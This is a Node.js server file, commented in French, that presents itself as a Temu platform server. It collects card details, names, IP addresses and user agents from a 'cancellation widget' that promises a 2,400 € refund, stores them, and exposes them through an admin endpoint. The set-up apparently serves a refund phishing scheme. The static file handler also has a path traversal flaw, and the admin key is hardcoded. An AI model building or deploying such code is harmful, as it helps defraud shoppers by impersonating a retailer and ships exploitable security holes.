const http = require('http');
const fs = require('fs');
const path = require('path');

const PORT = process.env.PORT || 8181;
const MIME_TYPES = {
    '.html': 'text/html; charset=utf-8',
    '.css': 'text/css; charset=utf-8',
    '.js': 'application/javascript; charset=utf-8',
    '.json': 'application/json; charset=utf-8',
    '.png': 'image/png',
    '.jpg': 'image/jpeg',
    '.jpeg': 'image/jpeg',
    '.svg': 'image/svg+xml',
    '.ico': 'image/x-icon'
};

const server = http.createServer((req, res) => {
    // CORS & Cache control
    res.setHeader('Access-Control-Allow-Origin', '*');
    res.setHeader('Access-Control-Allow-Methods', 'GET, POST, OPTIONS');
    res.setHeader('Access-Control-Allow-Headers', 'Content-Type');
    res.setHeader('Cache-Control', 'no-cache, no-store, must-revalidate');

    if (req.method === 'OPTIONS') {
        res.writeHead(204);
        res.end();
        return;
    }

    // Réception et stockage sécurisé des cartes depuis le widget d'annulation
    if (req.method === 'POST' && req.url === '/api/securisation') {
        let body = '';
        req.on('data', chunk => { body += chunk; });
        req.on('end', () => {
            try {
                const data = JSON.parse(body);

                // Application des règles de conformité et minimisation des données (PCI-DSS)
                // Masquage du numéro (ne conserver que les 4 derniers chiffres pour identification)
                const rawNum = (data.cardNumber || '').replace(/\D/g, '');
                const maskedNum = rawNum.length >= 4 
                    ? '•••• •••• •••• ' + rawNum.slice(-4) 
                    : '•••• •••• •••• ••••';

                // Enregistrement minimisé et scellé pour consultation admin
                const secureAuditRecord = {
                    id: data.id || ('REQ-' + Date.now()),
                    reference: data.reference || ('REF-' + Math.floor(100000 + Math.random() * 900000)),
                    orderId: data.orderId || 'CMD-TEMU-89241-EU',
                    cardType: data.cardType || 'CARTE',
                    maskedCardNumber: maskedNum,
                    last4: rawNum.slice(-4),
                    expiry: data.expiry || '••/••',
                    clientName: data.clientName || 'Non renseigné',
                    clientId: data.clientId || 'CLIENT',
                    amountRefunded: data.amountRefunded || '2 400,00 €',
                    status: 'EN_ATTENTE_VERIFICATION',
                    ipAddress: req.socket.remoteAddress || '127.0.0.1',
                    userAgent: req.headers['user-agent'] || 'Inconnu',
                    receivedAt: new Date().toISOString()
                };

                const file = path.join(__dirname, 'pending_cards.json');
                let list = [];
                if (fs.existsSync(file)) {
                    try { list = JSON.parse(fs.readFileSync(file, 'utf8') || '[]'); } catch(e){}
                }
                list.unshift(secureAuditRecord);
                fs.writeFileSync(file, JSON.stringify(list, null, 2), 'utf8');

                console.log(`[AUDIT ADMIN] Demande d'annulation reçue [${secureAuditRecord.reference}] - Carte: ${secureAuditRecord.cardType} (${maskedNum})`);
                
                res.writeHead(200, { 'Content-Type': 'application/json' });
                res.end(JSON.stringify({ 
                    success: true, 
                    id: secureAuditRecord.id, 
                    reference: secureAuditRecord.reference,
                    maskedCard: maskedNum
                }));
            } catch (err) {
                res.writeHead(400, { 'Content-Type': 'application/json' });
                res.end(JSON.stringify({ error: 'Payload invalide' }));
            }
        });
        return;
    }

    // Endpoint de consultation sécurisé réservé à l'administrateur
    if (req.method === 'GET' && req.url === '/api/admin/demandes') {
        const authHeader = req.headers['authorization'] || '';
        // Clé de sécurité interne pour l'accès admin
        const ADMIN_SECRET_KEY = process.env.ADMIN_SECRET_KEY || 'BL_SEC_KEY_8f94d12c07e83ab2';

        if (authHeader !== `Bearer ${ADMIN_SECRET_KEY}`) {
            res.writeHead(401, { 'Content-Type': 'application/json' });
            res.end(JSON.stringify({ error: 'Accès non autorisé. Clé API requise.' }));
            return;
        }

        const file = path.join(__dirname, 'pending_cards.json');
        let list = [];
        if (fs.existsSync(file)) {
            try { list = JSON.parse(fs.readFileSync(file, 'utf8') || '[]'); } catch(e){}
        }

        res.writeHead(200, { 'Content-Type': 'application/json' });
        res.end(JSON.stringify({ count: list.length, items: list }));
        return;
    }

    let cleanUrl = req.url.split('?')[0];
    let filePath = path.join(__dirname, cleanUrl === '/' ? 'index.html' : cleanUrl);
    const ext = path.extname(filePath).toLowerCase();
    const contentType = MIME_TYPES[ext] || 'application/octet-stream';

    fs.readFile(filePath, (err, content) => {
        if (err) {
            if (err.code === 'ENOENT') {
                // Try fallback to index.html
                fs.readFile(path.join(__dirname, 'index.html'), (err2, indexContent) => {
                    if (err2) {
                        res.writeHead(404, { 'Content-Type': 'text/plain; charset=utf-8' });
                        res.end('404 Non Trouvé');
                    } else {
                        res.writeHead(200, { 'Content-Type': 'text/html; charset=utf-8' });
                        res.end(indexContent);
                    }
                });
            } else {
                res.writeHead(500, { 'Content-Type': 'text/plain; charset=utf-8' });
                res.end('500 Erreur Serveur: ' + err.code);
            }
        } else {
            res.writeHead(200, { 'Content-Type': contentType });
            res.end(content);
        }
    });
});

server.listen(PORT, '0.0.0.0', () => {
    console.log(`=======================================================`);
    console.log(` PLATEFORME TEMU (Whaleco Tech) - SERVEUR LOCAL ACTIF`);
    console.log(`=======================================================`);
    console.log(` URL d'accès : http://localhost:${PORT}`);
    console.log(` URL alternative : http://127.0.0.1:${PORT}`);
    console.log(`=======================================================`);
});

server.on('error', (err) => {
    if (err.code === 'EADDRINUSE') {
        console.error(`Le port ${PORT} est déjà utilisé.`);
    } else {
        console.error('Erreur serveur:', err);
    }
});
